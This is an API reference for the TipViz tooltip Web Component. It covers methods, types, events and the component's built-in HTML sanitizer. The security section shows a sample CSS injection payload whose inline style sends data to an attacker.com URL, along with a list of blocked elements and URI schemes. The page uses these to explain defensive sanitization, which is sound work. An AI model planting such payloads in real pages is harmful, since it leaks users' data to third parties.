# API Reference

This page documents the public API, attributes, types and usage examples for the `TipVizTooltip` Web Component.

---

## TipVizTooltip

### HTML Usage

```html
<tip-viz-tooltip id="tooltip" transition-duration="300" stylesheet="/tooltip.css"></tip-viz-tooltip>
```

#### Observed attributes

- `transition-duration` (number): optional; controls the fade duration for show/hide in milliseconds. Defaults to `200ms`.
- `stylesheet` (string): optional; URL to a stylesheet that will be added inside the component's shadow root.
- `no-auto-reposition` (boolean): optional; if present, the element will not be moved to `document.body` on connect. See [Automatic repositioning](#automatic-repositioning-to-documentbody) for details.

### Working with the component in JavaScript

When you select the component in JavaScript, you get access to its methods for setting content, styles, and controlling visibility.

```js
// tooltip is an instance of the custom element and exposes the methods below
const tooltip = document.getElementById('tooltip');
```

#### Methods

- **`loadStylesheet`**: Loads or updates a `<link rel="stylesheet">` inside the component shadow root using the provided `url`.

  ```ts
  loadStylesheet(url: string): void;
  ```

- **`setHtml`**: Sets the callback used to render HTML content into the tooltip. When `show` is called the component sets the html content on the tooltip box using the returned string from this function.

    ```ts
    setHtml(fn: HtmlCallback): void;
    ```

- **`setDirection`**: Sets the callback that determines the placement `Direction` for a given `data` and `target`.

  ```ts
  setDirection(fn: DirectionFn): void;
  ```

- **`setOffset`**: Sets the callback that returns an `Offset` pair applied to the computed coordinates. The offset is interpreted as `[x, y]` — where `x` (horizontal) is added to `left` and `y` (vertical) is added to `top`. Both are in pixels.

  ```ts
  setOffset(fn: OffsetCallback): void;
  ```

- **`setStyles`**: Applies scoped CSS to the component. Internally it uses the `CSSStyleSheet.replaceSync()` API with `adoptedStyleSheets`. If the browser does not support it, it falls back to injecting a `<style>` element inside the shadow root.

   ```ts
   setStyles(cssString: string): void;
   ```

- **`setSanitizer`**: Sets a custom sanitizer function to override the default HTML sanitization. Pass `null` to disable sanitization (only for trusted HTML content). The default sanitizer removes dangerous elements, strips event handler attributes, blocks malicious URI schemes, and strips all `url()` calls from inline `style` attributes to prevent CSS-based data exfiltration.

   ```ts
   setSanitizer(fn: SanitizerFn | null): void;
   ```

   Example with custom sanitizer:

   ```ts
   import { sanitize } from "tipviz";

   tooltip.setSanitizer((html) => {
     // Apply your own sanitization logic
     return sanitize(html);
   });
   ```

- **`show`**: Displays the tooltip with the provided `data` and positions it relative to the `target` element.

   ```ts
   show(data: any, target: Element): void;
   ```

- **`hide`**: Hides the tooltip and dispatches a bubbling, composed `hide` event.

  ```ts
  hide(): void;
  ```

#### External styling with `::part()`

The tooltip's inner `<div>` carries a `part="tooltip-box"` attribute:

```html
<tip-viz-tooltip id="tooltip"></tip-viz-tooltip>
```

This lets you style the tooltip from outside the shadow DOM via CSS `::part()`:

```css
tip-viz-tooltip::part(tooltip-box) {
  background: rgba(0, 0, 0, 0.9);
  color: white;
  padding: 8px;
  border-radius: 4px;
}
```

This approach does **not** require `setStyles()` and works independently of the internal CSS mechanism.

#### Automatic repositioning to `document.body`

The component **automatically moves itself to `document.body`** when connected. This ensures correct `window.scrollY`/`window.scrollX` positioning regardless of where you place the element in HTML — including inside framework root containers (`<div id="root">`), modals, or sidebar panels.

```html
<!-- This works correctly even inside a React root or Vue app container -->
<div id="root">
  <svg id="chart"></svg>
  <tip-viz-tooltip id="tooltip"></tip-viz-tooltip> <!-- will be moved to body -->
</div>
```

If you need to prevent this behavior, use the `no-auto-reposition` attribute:

```html
<tip-viz-tooltip id="tooltip" no-auto-reposition></tip-viz-tooltip>
```

> [!Note] The element is repositioned only once — on first connection. Moving it manually after that is not supported.

#### Lazy registration with `defineTooltip()`

The package auto-registers `<tip-viz-tooltip>` on import. For lazy/async scenarios, use `defineTooltip()` from the sub-path export:

```ts
import { defineTooltip } from "tipviz/components/tooltip";

// Registers only if not already defined — safe to call multiple times
await defineTooltip();
```

#### Events

- **`show`** — emitted when `show()` completes. `event.detail` contains:
  - `target`: the Element the tooltip was positioned against
  - `data`: the data object passed to `show`
  - `direction`: the resolved `Direction` string used for placement
  - `position`: `{ top, left }` numeric coordinates (before page scroll adjustments)

- **`hide`** — emitted when `hide()` is called.

Example:

```js
tooltip.addEventListener('show', (e) => console.log('shown', e.detail));
tooltip.addEventListener('hide', () => console.log('hidden'));
```

---

## Types

- **`Direction`**

```ts
type Direction = "n" | "s" | "e" | "w" | "nw" | "ne" | "sw" | "se";
```

Represents where the tooltip will be positioned relative to the target:

- `n` = above, `s` = below, `e` = right, `w` = left
- `nw`, `ne`, `sw`, `se` = corner placements

- **`Offset`**

```ts
type Offset = [number, number]; // [x, y] — x is horizontal (added to left), y is vertical (added to top)
```

An array of pixel offsets applied to the computed `top` and `left` coordinates. `x` shifts horizontally, `y` shifts vertically.

- **`HtmlCallback`**

```ts
type HtmlCallback = (...args: any[]) => string;
```

Function that returns an HTML string which will be set as the tooltip content.

- **`OffsetCallback`**

```ts
type OffsetCallback = (...args: any[]) => Offset;
```

Callback that returns an `Offset` tuple.

- **`DirectionFn`**

```ts
type DirectionFn = (...args: any[]) => Direction;
```

Callback used by `setDirection` to determine the desired `Direction` given the `data` and `target`.

---

## Security

### HTML Sanitization

The `TipVizTooltip` component includes a built-in HTML sanitizer that runs automatically when content is passed to `show()`. The sanitizer:

- **Removes dangerous elements**: `<script>`, `<iframe>`, `<object>`, `<embed>`, `<link>`, `<meta>`, `<base>`, `<form>`, `<input>`, `<button>`, `<textarea>`, `<select>`
- **Strips event handler attributes**: Any attribute matching `on*` (e.g., `onclick`, `onerror`, `onload`), plus `srcdoc` and `formaction`
- **Blocks malicious URI schemes**: Removes `javascript:` URIs and `data:` URIs that are not images (`data:image/*`)
- **Strips `url()` from inline styles**: All CSS `url()` calls in `style` attributes are replaced with empty `url()` tokens to prevent CSS-based data exfiltration attacks

#### Example: CSS URL Injection Prevention

Without sanitization, this malicious HTML would trigger a network request:

```html
<div style="background: url(https://attacker.com/steal?data=SECRET)">tooltip</div>
```

After sanitization, it becomes:

```html
<div style="background: url()">tooltip</div>
```

No network request is made, and the browser silently ignores the invalid `url()`.

### Custom Sanitization

If you need different sanitization rules, override the sanitizer via `setSanitizer()`:

```ts
import { sanitize } from "tipviz";

tooltip.setSanitizer((html) => {
  // Use the built-in sanitizer
  const cleaned = sanitize(html);
  // Apply additional transformations if needed
  return cleaned;
});

// Or disable sanitization for trusted content only
tooltip.setSanitizer(null); // Passes HTML through unchanged
```

### Untrusted Content Best Practices

When using `setHtml()` with untrusted or user-supplied data:

1. Always use the default sanitizer or provide your own
2. Avoid interpolating sensitive data (tokens, API keys) into tooltip content
3. If you must display user data, escape or sanitize it before passing to `setHtml()`
4. Consider combining with a Content Security Policy (CSP) for defense-in-depth

---

## Example (complete)

```js
const tooltip = document.getElementById('tooltip');

tooltip.setHtml((data) => `
  <div class="tooltip-content">
    <strong>${data.title}</strong>
    <div>${data.value}</div>
  </div>
`);

tooltip.setDirection((data, target) => {
  const rect = target.getBoundingClientRect();
  // prefer showing above if there's room
  return rect.top > 200 ? 'n' : 's';
});

tooltip.setOffset(() => [0, 6]); // shift 6px down (y) from computed top

tooltip.setStyles(`
  .tipviz-tooltip { background: rgba(0,0,0,0.8); color: white; padding: 6px; border-radius: 4px; }
`);

// Show and hide
tooltip.show({ title: 'Point A', value: 42 }, document.querySelector('#point-a'));
// later
tooltip.hide();
```
